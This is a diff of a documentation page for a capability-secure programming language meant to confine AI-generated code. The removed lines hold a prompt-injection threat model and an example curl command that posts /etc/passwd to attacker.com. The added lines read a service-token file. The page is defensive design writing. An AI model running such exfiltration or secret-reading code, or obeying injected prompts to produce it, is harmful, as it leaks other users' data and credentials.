@@ -1,73 +1,46 @@
-# The AI Security Problem
+# Popular Languages Are Unsafe for AI
 
-Large-language models can generate code to automate tasks with unconstrained capability.
-But cloud platforms cannot fully embrace this power: through _prompt injection_, a
-malicious user can trick the LLM into generating code that exceeds the user's authorized
-permissions — exfiltrating other users' data, escalating privileges, or calling out to
-attacker-controlled endpoints.
+When you let an AI agent write and run code to fulfill tasks, popular languages do not
+provide the mechanism to specify and enforce what the code can do.
 
-## Threat Model
+## Why existing languages are unsafe
 
-**Attacker**: A malicious user who crafts prompts to manipulate LLM-generated code.
-
-**Attack vector**: Prompt injection causes the LLM to generate code that exceeds the
-user's authorized permissions.
-
-**Attacker goals**:
-
-- Access other users' data
-- Escalate privileges beyond granted permissions
-- Exfiltrate data to external endpoints
-
-**Trust boundary**: The interface between platform-provided APIs and LLM-generated code.
-Platform API implementation is trusted; LLM-generated code is untrusted.
-
-## Ambient Authorities
-
-Nearly all popular languages expose powerful ambient authorities to programs:
-
-- Global variables
-- File system access
-- Network access
-- System calls
-- Foreign Function Interface (FFI)
-- Reflective language features
-
-With such authorities, a program can potentially do anything. The problem is
-structural — not a bug in any specific program:
+File I/O, environment variables, network access, subprocesses, and FFI are **ambient
+authorities**: code can reach them without receiving an explicit capability from its
+caller. A function meant to use a scoped API can also read a file accessible to the
+host process:
 
 ```python
-# Intended behavior
-content = open("report.txt").read()
+documents = document_api.list_my_documents()
 
-# Nothing in the language prevents this:
-import os
-os.system("curl -X POST https://attacker.com -d @/etc/passwd")
+from pathlib import Path
+secret = Path("/srv/app/secrets/service-token").read_text()
 ```
 
-The ambient authorities (`os`, `open`, network access) make confinement impossible at
-the language level.
+OS isolation can block access to files and networks, but it cannot by itself enforce
+application rules such as "query only this user's rows."
+[Compile-time sandboxing](../overview/capabilities.md) within a language restricts
+generated code to a scoped API whose trusted implementation enforces those rules.
 
-## Three Challenges
+## Three challenges
 
-Securing AI-generated code requires solving three distinct problems:
+Securing AI-generated code at the language level requires solving three problems.
 
-**Challenge 1 — Usability without ambient authorities.** A secure language must remove
-ambient authorities, but doing so naively means threading every capability through every
-function call. The language needs a way to propagate authorities implicitly while keeping
-them statically trackable — so the common case is ergonomic but every authority is
-auditable.
+1. **Usability without ambient authorities.** A secure language must remove ambient
+   authorities. Done naively, that means threading every capability through every
+   function call. The language needs to pass authorities implicitly while keeping them
+   statically trackable, so the common case stays ergonomic and every authority stays
+   auditable.
+2. **Security context representation.** The authority given to generated code must
+   encode the current user: not just "database access" but "this user's rows only."
+   Generated code must not be able to inspect, forge, or amplify that context. The
+   language needs a way to represent it and a type system that enforces the
+   abstraction boundary.
+3. **Authority attenuation.** Trusted code holds broad authorities. Generated code
+   should receive only the narrow slice it needs. The language must derive
+   fine-grained authorities from coarse ones and guarantee that the coarse authority
+   cannot be recovered through the derived one. Reflection and object inspection, as
+   in Java and JavaScript, break this guarantee.
 
-**Challenge 2 — Security context representation.** The authority given to untrusted code
-must encode the current user — not just "database access" but "this user's rows only."
-The security context must be abstract: untrusted code cannot inspect, forge, or amplify
-it. This requires both a representation mechanism and type-system enforcement of
-abstraction boundaries.
-
-**Challenge 3 — Authority attenuation.** Trusted code holds broad authorities; untrusted
-code should receive only the narrow slice it needs. The language must support deriving
-fine-grained authorities from coarse ones, with a guarantee that the coarse authority
-cannot be recovered through the derived one. Languages with reflection or object
-inspection (Java, JavaScript) defeat this guarantee.
-
-See [Two-World Architecture](two-worlds.md) for the structural mechanism that makes the guarantees possible, and [Language Design](language-design.md) for the language facilities that address each challenge.
+Jo is the first secure programming language to address these challenges. See
+[Two-world architecture](two-worlds.md) and [Secure language design](language-design.md).
